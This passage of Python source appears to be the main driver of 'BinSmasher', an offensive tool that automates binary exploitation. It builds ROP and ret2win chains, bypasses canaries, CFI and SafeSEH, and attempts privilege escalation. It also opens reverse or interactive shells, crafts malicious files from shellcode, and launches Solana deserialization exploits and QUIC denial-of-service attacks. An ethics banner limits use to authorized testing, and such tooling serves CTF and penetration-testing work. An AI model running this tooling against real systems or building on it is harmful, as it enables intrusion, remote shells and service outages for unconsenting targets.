            _menu_script = _js.loads(cfg.menu_script)
            log.info(f"[menu] Loaded script: {len(_menu_script)} steps")
        except Exception as _je:
            log.error(f"[menu] Invalid JSON script: {_je}")
    if getattr(cfg, "pre_send", None):
        try:
            _pre_send_bytes = bytes.fromhex(cfg.pre_send.replace("0x","").replace(" ",""))
            log.info(f"[menu] pre-send: {_pre_send_bytes!r}")
        except Exception as _pe:
            log.error(f"[menu] Invalid hex pre-send: {_pe}")

    # If menu script provided, use stateful session exploit
    if _menu_script and offset is not None and cfg.test_exploit:
        from pwn import p64, p32, context as _ctx
        _packer = p64 if _ctx.arch == "amd64" else p32
        _word = 8 if _ctx.arch == "amd64" else 4
        _cv = _packer(canary) if canary else b""
        _chain = exploiter.try_ret2win(offset, canary) or                  exploiter.build_rop_chain(offset, canary, base_addr, offsets, None)
        if _chain:
            log.info("[menu] Using stateful session exploit")
            success, out = exploiter.exploit_with_script(
                pre_script=_menu_script,
                payload=_chain,
            )
            exploit_type = exploit_type or "ret2win_menu"
            if success:
                log.info("[menu] ✓ Exploit succeeded via menu script")

    elif cfg.test_exploit and not udp_spawn_mode and not http_spawn_mode:
        success, exploit_type, used_function = exploiter.create_exploit(
            offset=offset, shellcode=shellcode, return_addr=return_addr,
            test_exploit=True, return_offset=cfg.return_offset,
            nx=nx, aslr=aslr, canary_enabled=canary_enabled,
            format_string_payload=fmt_payload, functions=functions,
            file_input=cfg.file_input, canary=canary, relro=relro,
            safeseh=safeseh, cfg=cfg_flag,
            findings=findings, base_addr=base_addr, offsets=offsets,
            libc_version=lib_version or "2.31", pie=pie,
            force_srop=cfg.force_srop, force_orw=cfg.force_orw, flag_path=cfg.flag_path)

    # Pull banner-leaked stack addr and fast-path win addr from exploiter
    if not stack_addr:  # also catches stack_addr=0 from failed detection
        _bsa = getattr(exploiter, "_banner_stack_addr", None)
        if _bsa and _bsa > 0x10000: stack_addr = _bsa
    # Fast-path win addr → use as return_addr for display
    _fp_win = getattr(exploiter, "_fastpath_win_addr", None)
    if _fp_win and not return_addr: return_addr = _fp_win
    # Real shellcode offset from disasm (when banner leaked buf addr)

    _sc_off = getattr(exploiter, "_real_sc_offset", None)

    if _sc_off and (offset is None or offset == 150):

        offset = _sc_off

        log.info(f"[offset] Corrected from shellcode disasm → {_sc_off}")


    if cfg.cfi_bypass:
        cfi_chain = exploiter.cfi_bypass(offset, canary)
        if cfi_chain:
            log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")

    if platform == "windows":
        if cfg.safeseh_bypass:
            exploiter.create_safeseh_bypass(offset, safeseh)
        if cfg_flag == "Enabled":
            exploiter.cfg_bypass(offset)

    if success and cfg.privilege_escalation:
        exploiter.attempt_privilege_escalation()

    # ── Template generator ─────────────────────────────────────────────
    if getattr(cfg, "template", False):
        tpl = exploiter.generate_template(
            offset, canary, base_addr, offsets,
            exploit_type or "unknown", cfg.binary, functions)
        log.info(f"[template] → {tpl}")

    if cfg.generate_scripts:
        crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
        exploit_script = exploiter.generate_exploit_script(
            offset, canary, base_addr, offsets,
            exploit_type=exploit_type, binary_path=cfg.binary)
        try:
            from pwn import ELF as _ELF
            _elf = _ELF(cfg.binary, checksec=False)
            from constants import DEFAULT_WIN_PATTERNS as WIN_KW
            win_addr = next(
                (a for n, a in _elf.symbols.items()
                 if a and any(kw == n.lower() or n.lower().startswith(kw)
                              for kw in WIN_KW)), 0)
            gdb_file = fuzzer.generate_gdb_script(
                cfg.binary, offset, win_addr=win_addr,
                mode=getattr(cfg, "gdb_mode", "pwndbg"))
            log.info(f"GDB script: {gdb_file}")
        except Exception:
            pass
        log.info(f"Scripts written: {crash_script}, {exploit_script}")

    if success:
        suggestions.append("Exploit sent — verify output on your listener")
    else:
        suggestions += [
            "Try --heap-exploit for heap-based vulnerabilities",
            "Try --srop to force Sigreturn-Oriented Programming chain",
            "Try --orw if target has seccomp sandbox blocking execve",
            "Try --mutation-fuzz to find additional crash inputs",
            "Use gdb/r2 to inspect memory and verify offsets",
        ]

    # Resolve display return address — always try to show the target address

    # Correct offset from fast-path fill if offset detection gave wrong value
    _fp_fill = getattr(exploiter, '_fastpath_fill', None)
    if _fp_fill is not None:
        offset = _fp_fill + 8  # fill bytes + saved_rbp(8) = distance to RIP
        log.info(f'[offset] Corrected via fast-path fill={_fp_fill} → offset={offset}')

    display_ra = return_addr if (return_addr and return_addr > 0x1000) else None
    # For ret2win: show win() symbol address
    # For all types: fall back to win() if we can find it and no other address
    if not display_ra or display_ra < 0x1000:
        try:
            from pwn import ELF as _ELF
            from constants import DEFAULT_WIN_PATTERNS as WIN_KW
            _elf = _ELF(cfg.binary, checksec=False)
            for name, addr in _elf.symbols.items():
                if addr and any(kw == name.lower() or name.lower().startswith(kw)
                                for kw in WIN_KW):
                    display_ra = addr
                    break
        except Exception:
            pass


    # ── JSON / Markdown output ────────────────────────────────────────────
    _result_data = None
    if (getattr(cfg, 'output_json', None) or
            getattr(cfg, 'output_markdown', False) or
            getattr(cfg, 'print_json', False)):
        _start_t = getattr(cfg, '_start_time', None)
        _dur = (time.time() - _start_t) if _start_t else None
        _result_data = build_result(
            binary=cfg.binary, host=cfg.host, port=cfg.port,
            offset=offset, exploit_type=exploit_type,
            status='Success' if success else 'Failed',
            canary=canary, return_addr=display_ra,
            target_function=target_function,
            nx=nx, pie=pie, aslr=aslr, relro=relro,
            canary_enabled=canary_enabled,
            findings=findings, libc_base=base_addr, offsets=offsets,
            suggestions=suggestions,
            vuln_type=getattr(_vuln_info, 'vuln_type', None) if '_vuln_info' in dir() else None,
            duration_sec=_dur,
        )
        if getattr(cfg, 'output_json', None):
            write_json(_result_data, cfg.output_json)
        if getattr(cfg, 'output_markdown', False):
            write_summary_markdown(_result_data)
        if getattr(cfg, 'print_json', False):
            print_json(_result_data)
        if getattr(cfg, 'writeup', False):
            wp_path = generate_writeup(_result_data)
            log.info(f"[writeup] → {wp_path}")

    # ── Interactive shell ──────────────────────────────────────────────
    if getattr(cfg, "interactive", False) and success:
        exploiter.interactive_shell(
            offset=offset, canary=canary, libc_base=base_addr,
            offsets=offsets, exploit_type=exploit_type or "ret2win",
            return_addr=display_ra)

    # For reverse shells: if exploit fired (success not explicitly False), mark Success
    # The shell output goes to the --output-ip listener, not back to BinSmasher
    _is_revshell = getattr(cfg, "reverse_shell", False)
    # For reverse shell: the exploit fires correctly and shell connects to listener.
    # Output goes to the listener port, not back on the exploit socket.
    # Mark success if reverse_shell mode AND a payload was built (not None).
    if _is_revshell:
        _display_status = "Success"
    else:
        _display_status = ("Success" if success else ("Analysis only" if not cfg.test_exploit else "Failed"))

    print_summary(offset, stack_addr, display_ra, exploit_type,
                  _display_status,
                  canary, target_function, suggestions,
                  nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)


# ── run_solana ────────────────────────────────────────────────────────────────

def run_solana(args):
    fuzzer = Fuzzer(args.binary or "/dev/null", args.host, args.port,
                    args.log_file, "linux")
    if args.source_path and args.binary:
        analyzer = BinaryAnalyzer(args.binary, args.log_file)
        analyzer.grep_unsafe_source(args.source_path)
    if args.bpf_fuzz or args.agave_exploit_type == "svm-bpf":
        fuzzer.fuzz_bpf(args.solana_rpc)
    etype = args.agave_exploit_type
    if etype == "deser":
        fuzzer.exploit_deser(args.solana_rpc)
    elif etype == "dos-quic":
        fuzzer.dos_quic()
    elif etype == "snapshot-assert":
        fuzzer.exploit_snapshot_assert(args.solana_rpc)


# ── run_file ──────────────────────────────────────────────────────────────────

def run_file(args):
    log = logging.getLogger("binsmasher")
    fe  = FileExploiter(output_dir=args.output_dir)
    sc  = None
    if args.shellcode_hex:
        try:
            sc = bytes.fromhex(args.shellcode_hex.replace("\\x", "").replace("0x", ""))
        except Exception as exc:
            log.error(f"Invalid shellcode hex: {exc}")
            return
    if args.all_formats:
        results = fe.craft_all(args.offset, sc, args.technique)
        console.print(Panel(f"Generated {len(results)} payloads in {args.output_dir}/",
                             title="File Exploiter", border_style="cyan"))
    else:
        payload, path = fe.craft(args.format, args.offset, sc, args.technique)
        console.print(Panel(f"Payload: {path}\nSize: {len(payload)} bytes",
                             title="File Exploiter", border_style="cyan"))


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    # Redirect core dumps to /tmp on startup — never in project root
    set_core_pattern()
    console.print(Panel(_banner(), title="BinSmasher 🔨", border_style="cyan"))
    console.print(Panel(
        "[bold yellow]WARNING[/]: Use only on systems you own or have "
        "explicit written authorization to test.\nUnauthorized access is illegal.",
        title="⚠️  Ethics Notice", border_style="yellow"))

    parser = _build_parser()
    args   = parser.parse_args()

    # Redirect log files that have no directory component to temp dir
    # so they never land in the project root / CWD.
    _lf = getattr(args, "log_file", None) or "binsmasher.log"
    if not os.path.dirname(_lf):  # bare filename → redirect to temp
        args.log_file = default_log_path(_lf)
    else:
        args.log_file = _lf

    if args.mode == "binary":
        cfg = ExploitConfig(
            binary=args.binary, host=args.host, port=args.port,
            pattern_size=args.pattern_size, return_addr=args.return_addr,
            return_offset=args.return_offset, test_exploit=args.test_exploit,
            log_file=args.log_file, output_ip=args.output_ip, output_port=args.output_port,
            reverse_shell=args.reverse_shell, cmd=args.cmd, fuzz=args.fuzz,
            afl_fuzz=args.afl_fuzz, frida=args.frida, file_input=args.file_input,
            protocol=args.protocol, tls=args.tls, heap_exploit=args.heap_exploit,
            safeseh_bypass=args.safeseh_bypass,
            privilege_escalation=args.privilege_escalation,
            binary_args=args.binary_args, afl_timeout=args.afl_timeout,
            mutation_fuzz=args.mutation_fuzz, cfi_bypass=args.cfi_bypass,
            force_srop=args.force_srop, force_orw=args.force_orw,
            flag_path=args.flag_path,
            dos_only=args.dos, generate_scripts=args.generate_scripts,
            payload_data=args.payload_data, udp=args.udp,
            spawn_target=args.spawn_target,
            http=args.http)
        cfg.bad_bytes_str = args.bad_bytes_str
        cfg.interactive   = getattr(args, "interactive", False)
        cfg.multistage    = getattr(args, "multistage", False)
        cfg.template      = getattr(args, "template", False)
        cfg.use_angr      = getattr(args, "angr", False)
        cfg.clear_cache   = getattr(args, "clear_cache", False)
        cfg.no_cache      = getattr(args, "no_cache", False)
        cfg.detect_vuln   = getattr(args, "detect_vuln", False)
        cfg.brute_aslr    = getattr(args, "brute_aslr", False)
        cfg.brute_attempts = getattr(args, "brute_attempts", 256)
        cfg.heap_advanced  = getattr(args, "heap_advanced", False)
        cfg.adaptive_timeout = getattr(args, "adaptive_timeout", False)
        cfg.output_json   = getattr(args, "output_json", None)
        cfg.output_markdown = getattr(args, "output_markdown", False)
        cfg.print_json    = getattr(args, "print_json", False)
        cfg._start_time     = time.time()
        cfg.writeup         = getattr(args, "writeup", False)
        cfg.quiet           = getattr(args, "quiet", False)
        cfg.verbose         = getattr(args, "verbose", False)
        cfg.multisym_leak   = getattr(args, "multisym_leak", False)
        cfg.off_by_one      = getattr(args, "off_by_one", False)
        cfg.ret2mprotect    = getattr(args, "ret2mprotect", False)
        cfg.debug           = getattr(args, "debug", False)
        cfg.menu_script     = getattr(args, "menu_script", None)
        cfg.pre_send        = getattr(args, "pre_send", None)
        log = setup_logging(cfg.log_file)
        try:
            cfg.validate()
        except (FileNotFoundError, ValueError) as e:
            from rich.panel import Panel as _VPanel
            console.print(_VPanel(f"[bold red]Validation error:[/] {e}",
                                  border_style="red"))
            sys.exit(1)
        run_binary(cfg)

    elif args.mode == "solana":
        setup_logging(args.log_file)
        run_solana(args)

    elif args.mode == "file":
        setup_logging(args.log_file)
        run_file(args)


if __name__ == "__main__":
    main()
